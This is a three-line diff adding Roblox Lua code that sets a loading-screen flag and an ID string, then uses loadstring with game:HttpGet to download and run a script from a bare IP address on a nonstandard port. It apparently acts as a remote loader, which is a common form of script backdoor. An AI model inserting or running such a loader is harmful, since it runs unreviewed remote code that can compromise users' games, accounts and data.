@@ -1,0 +1,3 @@
+_G.LoadingScreen = true
+ID="cd9ebdbc-76dc-44a5-a589-89b5d4147cf6";
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
